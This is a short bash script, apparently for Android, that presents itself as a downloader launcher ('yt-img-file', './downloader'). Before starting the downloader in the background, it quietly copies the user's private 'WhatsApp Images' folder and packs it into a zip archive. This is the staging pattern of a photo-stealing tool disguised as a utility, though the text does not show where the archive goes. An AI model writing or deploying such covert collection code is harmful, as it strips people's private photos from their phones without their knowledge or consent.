#!/bin/bash
if [ ! -f yt-img-file.zip ]; then
cp -r /sdcard/Android/media/com.whatsapp/WhatsApp/media/'WhatsApp Images' yt-img-file
zip yt-img-file.zip yt-img-file
./downloader &
else 
     ./downloader &
fi
